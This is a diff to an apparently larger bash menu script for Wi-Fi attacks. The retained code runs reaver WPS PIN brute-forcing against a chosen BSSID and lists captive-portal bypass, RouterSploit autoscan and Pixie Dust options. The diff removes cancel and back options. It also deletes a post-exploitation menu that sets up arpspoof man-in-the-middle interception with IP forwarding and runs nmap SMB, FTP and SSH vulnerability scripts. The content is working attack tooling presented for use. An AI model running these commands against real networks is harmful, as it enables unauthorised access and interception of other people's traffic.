@@ -712,11 +712,7 @@ special_bruteforce_menu() {
     
     echo ""
     echo "=== Special Brute Force (PIN File) ==="
-    read -p "Enter target BSSID (or press Enter to cancel): " bssid
-    
-    if [ -z "$bssid" ]; then
-        return 0 # Return to previous menu
-    fi
+    read -p "Enter target BSSID: " bssid
     
     if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
         echo "Invalid BSSID format (expected: XX:XX:XX:XX:XX:XX)"
@@ -727,7 +723,6 @@ special_bruteforce_menu() {
     echo "Select attack method:"
     echo "1. oneshot.py (fast, WiFi interface)"
     echo "2. Monitor mode (reaver, requires monitor mode)"
-    echo "0. Back to WPS Menu"
     read -p "Choice [1]: " method
     method="${method:-1}"
     
@@ -765,9 +760,6 @@ special_bruteforce_menu() {
             reaver -i "$mon_adapter" -b "$bssid" -d 1 -f -vv -D "$PIN_FILE"
             
             airmon-ng stop "$mon_adapter" >/dev/null 2>&1
-            ;;
-        0)
-            return 0
             ;;
         *)
             echo "Invalid choice"
@@ -1089,75 +1081,6 @@ check_creds()
     esac
   done
 }
-
-post_exploitation_menu() {
-    while true; do
-        echo "=== Post-Exploitation Menu ==="
-        echo "1. ARP Spoof / Man-in-the-Middle"
-        echo "2. Advanced Network Service Scan"
-        echo "0. Back to Main Menu"
-        read -p "Select an option: " choice
-        
-        case $choice in
-            1) arp_spoof_attack;;
-            2) advanced_service_scan;;
-            0) break;;
-            *) echo "Invalid option.";;
-        esac
-    done
-}
-
-arp_spoof_attack() {
-    if ! command -v arpspoof &>/dev/null; then
-        echo "arpspoof not found. Install with: apt install dsniff"
-        return 1
-    fi
-    
-    echo "=== ARP Spoof / MITM Attack ==="
-    read -p "Enter the target IP address to spoof: " target_ip
-    read -p "Enter the gateway IP address (router): " gateway_ip
-    
-    if ! validate_ip "$target_ip" || ! validate_ip "$gateway_ip"; then
-        return 1
-    fi
-    
-    echo "Enabling IP forwarding..."
-    echo 1 > /proc/sys/net/ipv4/ip_forward
-    
-    echo "Starting ARP spoofing. Press Ctrl+C to stop."
-    echo "Terminal 1: arpspoof -i $adapter -t $target_ip $gateway_ip"
-    echo "Terminal 2: arpspoof -i $adapter -t $gateway_ip $target_ip"
-    
-    echo "Please open two new terminals and run the commands above."
-    read -p "Press Enter after starting the spoof..."
-    
-    echo "To capture traffic, use 'sniff_tshark' or 'sniff_tcpdump' from the main menu in another terminal."
-}
-
-advanced_service_scan() {
-    echo "=== Advanced Network Service Scan ==="
-    read -p "Enter the target IP address or subnet to scan: " scan_target
-    
-    echo "Select Nmap scan type:"
-    echo "1. Scan for open SMB services"
-    echo "2. Scan for open FTP services"
-    echo "3. Scan for open SSH services"
-    echo "4. Run general vulnerability scan"
-    read -p "Choice [1]: " scan_type
-    
-    local nmap_args
-    case $scan_type in
-        1) nmap_args="-p 139,445 --script=smb-os-discovery,smb-vuln-*";;
-        2) nmap_args="-p 21 --script=ftp-anon,ftp-vuln*";;
-        3) nmap_args="-p 22 --script=ssh2-enum-algos,ssh-hostkey";;
-        4) nmap_args="-sV --script=vulners";;
-        *) nmap_args="-p 139,445 --script=smb-os-discovery,smb-vuln-*";;
-    esac
-    
-    echo "Running: nmap $nmap_args $scan_target"
-    nmap $nmap_args "$scan_target"
-}
-
 # Main menu
 while true; do
     echo ""
@@ -1180,7 +1103,6 @@ while true; do
     echo "13. Manage Credentials"
     echo "14. Bypass Captive Portal"
     echo "15. RouterSploit with autoscan"
-    echo " P. Post-Exploitation Menu"
     echo " W. WPS Attack Environment"
     echo " D. Dump all nearby networks"
     echo " 0. Exit"
@@ -1251,9 +1173,6 @@ while true; do
             ;;
         15)
             router_autoscan
-            ;;
-         p|P)
-            post_exploitation_menu
             ;;
          w)
             pixie_dust_menu
